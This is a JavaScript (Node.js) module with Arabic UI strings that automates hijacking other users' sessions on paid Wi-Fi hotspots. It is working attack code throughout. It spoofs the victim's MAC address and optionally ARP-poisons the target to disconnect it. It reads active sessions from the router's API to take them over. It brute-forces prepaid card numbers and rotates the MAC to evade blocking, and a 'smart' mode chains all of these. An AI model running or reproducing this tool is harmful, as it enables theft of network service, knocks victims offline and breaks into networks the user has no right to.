const { execFile } = require('child_process');
const path = require('path');
const { EventEmitter } = require('events');
const axios = require('axios');
const logger = require('../utils/logger');
const wifiManager = require('./wifi-manager');
const hotspotAuth = require('./hotspot-auth');
const arpSpoofer = require('./arp-spoofer');
const sessionStore = require('./session-store');
const cardBruteForce = require('./card-bruteforce');
const config = require('../../config/default.json');

const CHECK_SCRIPT = path.join(__dirname, '..', '..', 'scripts', 'check-session.ps1');

const STRATEGIES = {
  SESSION_WAIT: 'session-wait',
  CARD_LOGIN: 'card-login',
  API_SESSION: 'api-session',
  BRUTE_FORCE: 'brute-force',
  SMART_AUTO: 'smart-auto',
};

const STRATEGY_LABELS = {
  'session-wait': { icon: '⏳', label: 'انتظار الجلسة', description: 'انتحال MAC وانتظار تفعيل الجلسة (الأصلية)' },
  'card-login': { icon: '💳', label: 'تسجيل الدخول بالكروت', description: 'استخدام كرت متاح لتسجيل الدخول' },
  'api-session': { icon: '📡', label: 'API الراوتر', description: 'استخدام API الراوتر لسرقة الجلسة' },
  'brute-force': { icon: '⚡', label: 'تخمين الكروت', description: 'تخمين أرقام الكروت مع تدوير MAC' },
  'smart-auto': { icon: '🧠', label: 'ذكي', description: 'تجربة جميع الاستراتيجيات بالتسلسل' },
};

const progressEmitter = new EventEmitter();
progressEmitter.setMaxListeners(50);

let hijackProgress = null;
let hijackState = {
  inProgress: false,
  lastResult: null,
  history: [],
};

let _mikrotikApi = null;

function getMikrotikApi() {
  if (!_mikrotikApi) {
    const MikrotikApi = require('./mikrotik-api');
    _mikrotikApi = new MikrotikApi(config.router || {});
  }
  return _mikrotikApi;
}

function runPowerShell(scriptPath, args) {
  return new Promise((resolve, reject) => {
    const params = [
      '-NoProfile', '-ExecutionPolicy', 'Bypass',
      '-File', scriptPath, ...args,
    ];
    execFile('powershell.exe', params, { timeout: 30000 }, (err, stdout, stderr) => {
      if (err) {
        reject(new Error(`PowerShell error: ${err.message}`));
        return;
      }
      try {
        const result = JSON.parse(stdout.trim());
        resolve(result);
      } catch {
        reject(new Error(stderr || 'Parse error'));
      }
    });
  });
}

async function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function emitStep(step, status, data) {
  const event = { step, status, timestamp: Date.now() };
  if (data !== undefined && data !== null) {
    try { JSON.stringify(data); event.data = data; }
    catch { event.data = typeof data === 'string' ? data : '[complex]'; }
  }
  if (hijackProgress) {
    const storeEvent = { ...event };
    const existing = hijackProgress.steps.findIndex(s => s.step === step);
    if (existing >= 0) hijackProgress.steps[existing] = storeEvent;
    else hijackProgress.steps.push(storeEvent);
    hijackProgress.currentStep = step;
    hijackProgress.lastUpdate = Date.now();
  }
  progressEmitter.emit('hijack-step', event);
  progressEmitter.emit('hijack-progress', hijackProgress);
}

function emitLog(message, type = 'info') {
  const event = { message, type, timestamp: Date.now() };
  if (hijackProgress) {
    hijackProgress.logs.push(event);
  }
  progressEmitter.emit('hijack-log', event);
}

async function detectHotspot(gatewayIp) {
  const configUrl = hotspotAuth.getConfig().url;
  const tryUrls = [
    configUrl,
    gatewayIp ? `http://${gatewayIp}/` : null,
    gatewayIp ? `http://${gatewayIp}/status` : null,
    gatewayIp ? `http://${gatewayIp}/hotspotlogin` : null,
    'http://m.net/',
    'http://m.net/index.html',
    'http://www.h.net/',
    'http://www.h.net/index.html',
    gatewayIp ? `http://${gatewayIp}/login` : null,
  ].filter((v, i, a) => v && a.indexOf(v) === i);

  for (const tryUrl of tryUrls) {
    emitLog(`🔎 تجربة URL: ${tryUrl}`);
    try {
      const resp = await axios.get(tryUrl, {
        timeout: 6000,
        validateStatus: () => true,
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      });
      const html = typeof resp.data === 'string' ? resp.data : '';
      if (html && html.length > 50) {
        const sessionActive = html.includes('remain_bytes_total') || html.includes('تم تسجيل') || html.includes('status.html');
        emitLog(`✅ الهوتسبوت: ${tryUrl} (${resp.status}, ${html.length}b)`);
        if (sessionActive) {
          return { found: true, url: tryUrl, sessionActive: true };
        }
        return { found: true, url: tryUrl, sessionActive: false };
      }
      emitLog(`⚠️ ${tryUrl}: استجابة صغيرة (${html.length}b)`);
    } catch (err) {
      emitLog(`⚠️ ${tryUrl}: فشل الاتصال`);
    }
  }
  return { found: false, url: null, sessionActive: false };
}

async function checkSessionViaStatus(baseUrl, maxAttempts = 5) {
  const statusUrl = baseUrl.replace(/\/+$/, '').replace(/\/index\.html$/, '') + '/status';
  for (let i = 0; i < maxAttempts; i++) {
    await sleep(1000);
    try {
      const resp = await axios.get(statusUrl, { timeout: 2000, validateStatus: () => true });
      const html = typeof resp.data === 'string' ? resp.data : '';
      if (html.includes('remain_bytes_total') || html.includes('تم تسجيل') || html.includes('status.html')) {
        return { sessionActive: true, remainBytes: 'available' };
      }
      emitLog(`⏳ في انتظار الجلسة... (${i+1}/${maxAttempts})`);
    } catch {
      emitLog(`⏳ في انتظار الاستجابة... (${i+1}/${maxAttempts})`);
    }
  }
  return { sessionActive: false };
}

async function tryCardLogin(hotspotUrl) {
  const cards = sessionStore.getCards().filter(c => c.status === 'ready' || c.status === 'active');
  if (cards.length === 0) {
    emitLog('❌ لا توجد كروت متاحة', 'error');
    return { success: false, usedCards: [] };
  }

  emitLog(`💳 تجربة ${cards.length} كرت متاح`);
  const usedCards = [];

  for (const card of cards) {
    emitLog(`🔑 تجربة الكرت ****${card.number.slice(-4)}`);
    try {
      const result = await hotspotAuth.login(card.number, card.domain);
      if (result.isSuccess) {
        emitLog(`✅ تسجيل دخول ناجح بالكرت ****${card.number.slice(-4)}`, 'success');
        usedCards.push(card.number.slice(-4));
        const idx = sessionStore.getCards().findIndex(c => c.number === card.number);
        if (idx >= 0) sessionStore.markCardUsed(idx);

        sessionStore.addHistoryEntry({
          type: 'login',
          cardNumber: card.number.slice(-4),
          domain: card.domain,
          success: true,
          source: 'hijack-card-login',
        });

        return { success: true, usedCards, sessionInfo: { sessionActive: true, card: card.number.slice(-4) } };
      }
      emitLog(`⚠️ الكرت ****${card.number.slice(-4)}: ${result.error || 'فشل'}`);
    } catch (err) {
      emitLog(`⚠️ الكرت ****${card.number.slice(-4)}: ${err.message}`);
    }
  }

  emitLog('❌ جميع الكروت المتاحة فشلت', 'error');
  return { success: false, usedCards };
}

async function tryApiSessionSteal(targetIp, targetMac) {
  const api = getMikrotikApi();
  if (!api.enabled) {
    emitLog('⚠️ API الراوتر غير مهيأ — تخطي', 'warn');
    return { success: false };
  }

  emitLog('📡 الاتصال بـ API الراوتر...');
  try {
    const apiResult = await api.getAllDevices();
    if (!apiResult.success) {
      emitLog(`⚠️ فشل الاتصال بـ API الراوتر: ${apiResult.errors.join(', ')}`, 'warn');
      return { success: false };
    }

    const hotspotSessions = apiResult.devices.filter(d => d.source === 'hotspot-active');
    const targetSession = hotspotSessions.find(s => s.mac === targetMac.toUpperCase());

    if (targetSession) {
      emitLog(`✅ تم العثور على جلسة نشطة للهدف عبر API: ${targetSession.user || 'مجهول'}`, 'success');
      sessionStore.addHistoryEntry({
        type: 'hijack',
        targetIp,
        targetMac,
        success: true,
        method: 'api-session-steal',
        note: `Session found via API: ${targetSession.user || 'unknown'}`,
      });
      return { success: true, sessionInfo: { sessionActive: true, source: 'api', user: targetSession.user } };
    }

    const allSessions = hotspotSessions.length;
    emitLog(`⚠️ لا توجد جلسة نشطة للهدف في API (${allSessions} جلسة نشطة ككل)`, 'warn');
    return { success: false, allSessions };
  } catch (err) {
    emitLog(`⚠️ فشل API: ${err.message}`, 'warn');
    return { success: false };
  }
}

async function tryBruteForce(hotspotUrl) {
  const cards = sessionStore.getCards();
  if (cards.length > 0) {
    emitLog('💳 توجد كروت مخزنة — استخدام الكارد لوجين بدلاً من التخمين');
    return { success: false, skipped: true };
  }

  emitLog('⚡ بدء تخمين الكروت...');
  let testedCount = 0;
  const PREFIX = '262277';
  const MAX_TESTS = 50;
  const BATCH_SIZE = 3;
  let blocked = false;

  for (let start = 0; start < MAX_TESTS && !blocked; start += BATCH_SIZE) {
    const batch = [];
    for (let j = 0; j < BATCH_SIZE && (start + j) < MAX_TESTS; j++) {
      const num = start + j;
      const cardNum = `${PREFIX}${String(num).padStart(4, '0')}`;
      batch.push(cardNum);
    }

    const results = await Promise.allSettled(batch.map(cardNum =>
      hotspotAuth.login(cardNum, '1024K/2048K').then(r => ({ cardNum, r })).catch(e => ({ cardNum, r: { isSuccess: false, error: e.message } }))
    ));

    for (const result of results) {
      const { cardNum, r } = result.value || {};
      if (!r) continue;
      testedCount++;

      if (r.isSuccess) {
        emitLog(`✅ كرت صالح: ****${cardNum.slice(-4)}`, 'success');
        cardBruteForce.addFoundCard(cardNum, '1024K/2048K');
        sessionStore.addHistoryEntry({
          type: 'bruteforce_found',
          cardNumber: cardNum.slice(-4),
          domain: '1024K/2048K',
          source: 'hijack-brute-force',
        });
        return { success: true, sessionInfo: { sessionActive: true, card: cardNum.slice(-4) }, testedCount };
      }

      if (r.statusCode === 403) {
        emitLog(`🚫 محظور بعد ${testedCount} محاولة — تدوير MAC`, 'warn');
        blocked = true;
        try {
          const newMac = wifiManager.generateRandomMac();
          await wifiManager.spoofMac(newMac, { noLaaFix: true });
          emitLog(`🔄 MAC تم تدويره إلى ${newMac}`);
          await sleep(4000);
        } catch (err) {
          emitLog(`⚠️ فشل تدوير MAC: ${err.message}`, 'warn');
        }
        break;
      }
    }

    if (!blocked) {
      await sleep(1000);
    }
  }

  emitLog(`❌ تخمين الكروت: ${testedCount} محاولة دون نتيجة`, 'error');
  return { success: false, testedCount };
}

async function trySmartAuto(targetIp, targetMac, gatewayIp) {
  emitLog('🧠 تشغيل الوضع الذكي — تجربة جميع الاستراتيجيات');

  const api = getMikrotikApi();

  if (api.enabled) {
    emitLog('📡 1/4 التحقق من API الراوتر...');
    const apiResult = await tryApiSessionSteal(targetIp, targetMac);
    if (apiResult.success) {
      return { strategy: 'api-session', ...apiResult };
    }
  }

  emitLog('⏳ 2/4 انتظار الجلسة (10 ثوان)...');
  const hotspotUrl = hotspotAuth.getConfig().url || `http://${gatewayIp || 'm.net'}/`;
  const waitResult = await checkSessionViaStatus(hotspotUrl, 10);
  if (waitResult.sessionActive) {
    return { strategy: 'session-wait', success: true, sessionInfo: waitResult };
  }

  const availableCards = sessionStore.getCards().filter(c => c.status === 'ready' || c.status === 'active');
  if (availableCards.length > 0) {
    emitLog(`💳 3/4 تسجيل الدخول بالكروت (${availableCards.length} متاح)...`);
    const cardResult = await tryCardLogin(hotspotUrl);
    if (cardResult.success) {
      return { strategy: 'card-login', ...cardResult };
    }
  }

  emitLog('⚡ 4/4 تخمين الكروت...');
  const bruteResult = await tryBruteForce(hotspotUrl);
  if (bruteResult.success) {
    return { strategy: 'brute-force', ...bruteResult };
  }

  return { strategy: 'smart-auto', success: false };
}

const sessionHijack = {
  getProgressEmitter() { return progressEmitter; },
  getCurrentProgress() { return hijackProgress; },
  getStrategies() {
    return Object.entries(STRATEGY_LABELS).map(([key, val]) => ({
      id: key, icon: val.icon, label: val.label, description: val.description,
    }));
  },

  async checkTarget(ip, mac) {
    try {
      const checkResult = await runPowerShell(CHECK_SCRIPT, ['-TargetMac', mac]);
      if (!checkResult.success) {
        return { isSuccess: false, value: null, error: checkResult.error || 'Session check failed', statusCode: 500 };
      }
      return {
        isSuccess: true,
        value: {
          ourIp: checkResult.ourIp,
          ourMac: checkResult.ourMac,
          gatewayIp: checkResult.gatewayIp,
          hotspotReachable: checkResult.hotspotReachable,
          sessionActive: checkResult.sessionActive,
          remainBytes: checkResult.remainBytes,
          sessionTimeLeft: checkResult.sessionTimeLeft,
          usedBytes: checkResult.usedBytes,
          targetConflict: checkResult.targetConflict,
        },
        error: null,
        statusCode: 200,
      };
    } catch (err) {
      return { isSuccess: false, value: null, error: err.message, statusCode: 500 };
    }
  },

  async hijackTarget(targetIp, targetMac, options = {}) {
    if (hijackState.inProgress) {
      return { isSuccess: false, value: null, error: 'Hijack already in progress', statusCode: 409 };
    }

    hijackState.inProgress = true;
    const hijackId = Date.now().toString(36);
    let originalMac = null;
    let macSpoofed = false;
    let startTime = Date.now();

    hijackProgress = {
      hijackId, targetIp, targetMac,
      steps: [], logs: [],
      currentStep: 'starting', progress: 0,
      startTime, lastUpdate: Date.now(),
    };

    const scanHistoryStore = require('./scan-history');

    const restoreOriginalMac = async () => {
      if (!macSpoofed) return;
      try {
        emitLog(`♻️ استعادة MAC الأصلي ${originalMac}...`);
        if (originalMac && originalMac !== 'غير معروف') {
          await wifiManager.spoofMac(originalMac, { noLaaFix: true });
        } else {
          await wifiManager.resetMac();
        }
        emitLog(`✅ تم استعادة MAC`);
      } catch (restoreErr) {
        logger.warn('Failed to restore MAC after hijack failure', restoreErr.message);
      }
    };

    const complete = async (hijackSuccess, sessionInfo, loginResult, strategyUsed) => {
      const elapsed = Date.now() - startTime;

      if (!hijackSuccess && macSpoofed) {
        await restoreOriginalMac();
      }

      const result = {
        hijackId, success: hijackSuccess, targetIp, targetMac,
        originalMac, currentMac: targetMac,
        steps: hijackProgress ? hijackProgress.steps : [],
        sessionInfo, loginResult, elapsed,
        strategy: strategyUsed || 'unknown',
      };

      if (hijackProgress) {
        hijackProgress.progress = 100;
        emitStep('complete', hijackSuccess ? 'done' : 'failed', {
          success: hijackSuccess, elapsed,
          strategy: strategyUsed || 'none',
          message: hijackSuccess ? 'اختراق ناجح' : 'فشل الاختراق',
        });
        emitLog(
          hijackSuccess
            ? `✅✅✅ اختراق ناجح! (${(elapsed/1000).toFixed(1)}ث) [${strategyUsed || '?'}]`
            : `❌❌❌ فشل الاختراق`,
          hijackSuccess ? 'success' : 'error'
        );
      }

      hijackState.lastResult = result;
      hijackState.history.unshift({ ...result, timestamp: new Date().toISOString() });
      if (hijackState.history.length > 50) hijackState.history.pop();
      sessionStore.addHistoryEntry({
        type: 'hijack', targetIp, targetMac,
        success: hijackSuccess,
        strategy: strategyUsed || 'unknown',
        steps: hijackProgress ? hijackProgress.steps.length : 0,
      });

      if (hijackSuccess) scanHistoryStore.recordHijackForMac(targetMac);

      logger.info(`Hijack ${hijackSuccess ? 'SUCCESS' : 'FAILED'} for ${targetIp} (${(elapsed/1000).toFixed(1)}s) [strategy: ${strategyUsed || 'none'}]`);

      hijackState.inProgress = false;
      hijackProgress = null;

      let errorMsg = null;
      if (!hijackSuccess) {
        if (strategyUsed === 'session-wait') errorMsg = 'انتهت مهلة انتظار الجلسة';
        else if (strategyUsed === 'card-login') errorMsg = 'فشل تسجيل الدخول بجميع الكروت المتاحة';
        else if (strategyUsed === 'api-session') errorMsg = 'لا توجد جلسة نشطة للهدف في الراوتر';
        else if (strategyUsed === 'brute-force') errorMsg = 'فشل تخمين الكروت';
        else if (strategyUsed === 'smart-auto') errorMsg = 'فشلت جميع الاستراتيجيات المتاحة';
        else errorMsg = 'فشل الاختراق';
      }

      return {
        isSuccess: hijackSuccess,
        value: result,
        error: errorMsg,
        statusCode: hijackSuccess ? 200 : 500,
      };
    };

    const handleError = async (err) => {
      hijackState.inProgress = false;
      if (macSpoofed) {
        await restoreOriginalMac();
      }
      logger.error('Hijack error', err.message);
      emitStep('error', 'failed', err.message);
      emitLog(`❌ خطأ: ${err.message}`, 'error');
      const result = { hijackId, targetIp, targetMac, steps: hijackProgress ? hijackProgress.steps : [], error: err.message };
      hijackProgress = null;
      return { isSuccess: false, value: result, error: err.message, statusCode: 500 };
    };

    const strategy = options.strategy || 'smart-auto';
    logger.info(`Starting hijack: ${targetIp} / ${targetMac} [strategy: ${strategy}]`);
    emitLog(`🚀 بدء اختراق ${targetIp} (${STRATEGY_LABELS[strategy]?.label || strategy})`);

    try {
      emitStep('save_original_mac', 'running');
      try {
        const quick = await wifiManager.quickCheck();
        originalMac = quick ? quick.macAddress : null;
      } catch {}
      if (!originalMac) {
        try { originalMac = await wifiManager.getCurrentMac(); } catch {}
      }
      if (!originalMac) originalMac = 'غير معروف';
      hijackProgress.progress = 10;
      emitStep('save_original_mac', 'done', originalMac);
      emitLog(`💾 حفظ MAC الأصلي: ${originalMac}`);

      let gatewayIp = null;
      try {
        const { execFileSync } = require('child_process');
        const ipOut = execFileSync('powershell.exe', [
          '-NoProfile', '-Command',
          '$r=Get-NetRoute -DestinationPrefix "0.0.0.0/0"|Where-Object NextHop -ne "0.0.0.0"|Select-Object -First 1; if($r){$r.NextHop}else{$null}'
        ], { timeout: 3000, encoding: 'utf-8' });
        gatewayIp = (ipOut || '').trim();
      } catch {}
      if (!gatewayIp) {
        try {
          const arpOut = require('child_process').execFileSync('arp', ['-a'], { timeout: 2000, encoding: 'utf-8' });
          const m = arpOut.match(/(\d+\.\d+\.\d+\.\d+)\s+dynamic/);
          if (m) gatewayIp = m[1];
        } catch {}
      }
      if (gatewayIp) emitLog(`🌐 البوابة: ${gatewayIp}`);

      if (options.disconnectFirst) {
        emitStep('arp_poison', 'running');
        const poisonSec = options.disconnectDuration || 10;
        emitLog(`☠️ تسميم ARP للهدف ${targetIp} لمدة ${poisonSec} ثوانٍ`);
        await arpSpoofer.poisonAndWait(targetIp, targetMac, poisonSec * 1000);
        hijackProgress.progress = 20;
        emitStep('arp_poison', 'done');
        emitLog(`✅ تم فصل الهدف ${targetIp}`);
      }

      emitStep('spoof_mac', 'running');
      emitLog(`🔄 تغيير MAC إلى ${targetMac}`);
      await wifiManager.spoofMac(targetMac, { noLaaFix: true });
      macSpoofed = true;
      hijackProgress.progress = 40;
      emitStep('spoof_mac', 'done', targetMac);
      emitLog(`✅ MAC تم التغيير: ${originalMac} ← ${targetMac}`);

      emitStep('wait_for_connection', 'running');
      emitLog(`📶 انتظار الاتصال بالشبكة...`);

      let connected = false;
      let scanAttempt = 0;
      const startWait = Date.now();
      const MAX_WAIT_MS = 40000;

      while (Date.now() - startWait < MAX_WAIT_MS) {
        scanAttempt++;
        try {
          const quick = await wifiManager.quickCheck();
          if (quick && quick.connected && quick.ssid) {
            emitLog(`✅ متصل بـ ${quick.ssid} (بعد ${scanAttempt} محاولة)`);
            connected = true;
            break;
          }
        } catch {}
        await sleep(1000);
      }

      if (!connected) {
        await sleep(2000);
        try {
          const quick = await wifiManager.quickCheck();
          if (quick && quick.connected && quick.ssid) {
            connected = true;
            emitLog(`✅ متصل بـ ${quick.ssid}`);
          }
        } catch {}
      }

      if (!connected) {
        emitLog(`⚠️ netsh لم يكتشف الاتصال, جاري محاولة ping...`);
        try {
          const ping = require('child_process').execFileSync('ping', ['-n', '1', '-w', '2000', gatewayIp || '8.8.8.8'], { timeout: 3000, encoding: 'utf-8', stdio: 'pipe' });
          if (ping.includes('TTL=') || ping.includes('Reply from')) {
            connected = true;
            emitLog(`✅ ping ناجح - متصل بالشبكة`);
          }
        } catch {}
        if (!connected) {
          try {
            const { execFileSync } = require('child_process');
            const adapters = execFileSync('powershell', ['-NoProfile', '-Command', '(Get-NetAdapter -Name \"Wi-Fi\" -ErrorAction SilentlyContinue).Status'], { timeout: 5000, encoding: 'utf-8' });
            if (adapters.trim() === 'Up') {
              connected = true;
              emitLog(`✅ محول WiFi في حالة Up`);
            }
          } catch {}
        }
      }

      hijackProgress.progress = 55;
      emitStep('wait_for_connection', 'done');
      emitLog(`✅ تم الاتصال بالشبكة`);

      emitStep('detect_hotspot', 'running');
      const detectedHotspot = await detectHotspot(gatewayIp);

      if (!detectedHotspot || !detectedHotspot.found) {
        emitLog(`❌ لم يتم العثور على الهوتسبوت`, 'error');
        emitStep('detect_hotspot', 'failed', null);
        return complete(false, null, null, strategy);
      }

      if (detectedHotspot.sessionActive) {
        emitLog(`✅ الجلسة نشطة! تم اكتشاف جلسة موجودة مسبقاً`, 'success');
        emitStep('detect_hotspot', 'done', detectedHotspot);
        hijackProgress.progress = 90;
        emitStep('verify_session', 'done', { sessionActive: true });
        return complete(true, { sessionActive: true }, null, 'session-found');
      }

      emitStep('detect_hotspot', 'done', detectedHotspot);
      hijackProgress.progress = 65;

      emitStep('verify_session', 'running');
      emitLog(`🔍 تشغيل الاستراتيجية: ${STRATEGY_LABELS[strategy]?.label || strategy}`);

      let finalResult = { success: false, sessionInfo: null };

      if (strategy === 'session-wait') {
        emitLog(`⏳ انتظار الجلسة لمدة 20 ثانية...`);
        const waitResult = await checkSessionViaStatus(detectedHotspot.url, 20);
        finalResult = { success: waitResult.sessionActive, sessionInfo: waitResult };
      } else if (strategy === 'card-login') {
        emitLog(`💳 تجربة الكروت المتاحة...`);
        const cardResult = await tryCardLogin(detectedHotspot.url);
        finalResult = { success: cardResult.success, sessionInfo: cardResult.sessionInfo };
      } else if (strategy === 'api-session') {
        const apiResult = await tryApiSessionSteal(targetIp, targetMac);
        finalResult = { success: apiResult.success, sessionInfo: apiResult.sessionInfo };
      } else if (strategy === 'brute-force') {
        const bruteResult = await tryBruteForce(detectedHotspot.url);
        finalResult = { success: bruteResult.success, sessionInfo: bruteResult.sessionInfo };
      } else if (strategy === 'smart-auto') {
        const smartResult = await trySmartAuto(targetIp, targetMac, gatewayIp);
        finalResult = { success: smartResult.success, sessionInfo: smartResult.sessionInfo, strategy: smartResult.strategy };
      }

      hijackProgress.progress = 90;
      emitStep('verify_session', 'done', finalResult.sessionInfo);

      const effectiveStrategy = finalResult.strategy || strategy;

      if (!finalResult.success) {
        emitLog(`❌ ${STRATEGY_LABELS[effectiveStrategy]?.label || effectiveStrategy}: فشل`, 'error');
        return complete(false, finalResult.sessionInfo, null, effectiveStrategy);
      }

      return complete(true, finalResult.sessionInfo, null, effectiveStrategy);
    } catch (err) {
      return handleError(err);
    }
  },

  async quickHijack(targetIp, targetMac, options = {}) {
    return this.hijackTarget(targetIp, targetMac, { ...options, disconnectFirst: false });
  },

  async fullHijack(targetIp, targetMac, options = {}) {
    return this.hijackTarget(targetIp, targetMac, {
      ...options,
      disconnectFirst: true,
      disconnectDuration: 12,
    });
  },

  async verifyCurrentSession() {
    try {
      const result = await hotspotAuth.getRemainingQuota();
      if (result.isSuccess && result.value.isLoggedIn) {
        return {
          isSuccess: true,
          value: {
            isLoggedIn: true,
            sessionActive: true,
            quota: result.value,
            ourMac: await wifiManager.getCurrentMac(),
          },
          error: null,
          statusCode: 200,
        };
      }

      const check = await runPowerShell(CHECK_SCRIPT, []);
      return {
        isSuccess: true,
        value: {
          isLoggedIn: false,
          sessionActive: check.sessionActive || false,
          hotspotReachable: check.hotspotReachable || false,
          ourIp: check.ourIp,
          ourMac: check.ourMac,
        },
        error: null,
        statusCode: 200,
      };
    } catch (err) {
      return { isSuccess: false, value: null, error: err.message, statusCode: 500 };
    }
  },

  async analyzeTarget(targetIp, targetMac, gatewayIp) {
    const available = [];
    const cards = sessionStore.getCards().filter(c => c.status === 'ready' || c.status === 'active');

    if (cards.length > 0) {
      available.push({
        id: 'card-login',
        icon: '💳',
        label: 'تسجيل الدخول بالكروت',
        description: `${cards.length} كرت متاح`,
        confidence: 'high',
        priority: 1,
      });
    }

    const api = getMikrotikApi();
    let apiHasSessions = false;
    if (api.enabled) {
      try {
        const activeSessions = await api.getActiveHotspotSessions();
        apiHasSessions = activeSessions.length > 0;
        const targetSession = activeSessions.find(s => s.mac === (targetMac || '').toUpperCase());
        available.push({
          id: 'api-session',
          icon: '📡',
          label: 'API الراوتر',
          description: targetSession
            ? `✅ جلسة نشطة للهدف موجودة (${targetSession.user || 'مجهول'})`
            : `${activeSessions.length} جلسة نشطة (لكن ليست للهدف)`,
          confidence: targetSession ? 'very-high' : 'medium',
          priority: targetSession ? 0 : 3,
        });
      } catch (err) {
        available.push({
          id: 'api-session',
          icon: '📡',
          label: 'API الراوتر',
          description: `مهيأ لكن غير متاح: ${err.message}`,
          confidence: 'low',
          priority: 10,
        });
      }
    } else {
      available.push({
        id: 'api-session',
        icon: '📡',
        label: 'API الراوتر',
        description: 'غير مهيأ — هيئه في الإعدادات',
        confidence: 'low',
        priority: 10,
      });
    }

    if (gatewayIp || hotspotAuth.getConfig().url) {
      available.push({
        id: 'session-wait',
        icon: '⏳',
        label: 'انتظار الجلسة',
        description: 'يعمل فقط إذا كانت الجلسة نشطة مسبقاً',
        confidence: 'low',
        priority: 4,
      });
    }

    if (cards.length === 0) {
      available.push({
        id: 'brute-force',
        icon: '⚡',
        label: 'تخمين الكروت',
        description: 'تخمين أرقام مع تدوير MAC',
        confidence: 'medium',
        priority: 5,
      });
    }

    available.sort((a, b) => a.priority - b.priority);

    const recommendation = available.find(a => a.confidence === 'very-high' || a.confidence === 'high')
      || available.find(a => a.confidence === 'medium')
      || available[0];

    return {
      targetIp, targetMac, gatewayIp,
      strategies: available,
      recommendation: recommendation ? recommendation.id : 'smart-auto',
      cardCount: cards.length,
      apiEnabled: api.enabled,
    };
  },

  getState() {
    return {
      inProgress: hijackState.inProgress,
      lastResult: hijackState.lastResult,
      history: hijackState.history.slice(0, 20),
      historyCount: hijackState.history.length,
      strategies: this.getStrategies(),
    };
  },

  clearHistory() {
    hijackState.history = [];
    hijackState.lastResult = null;
    return { isSuccess: true, value: null, error: null, statusCode: 200 };
  },
};

module.exports = sessionHijack;
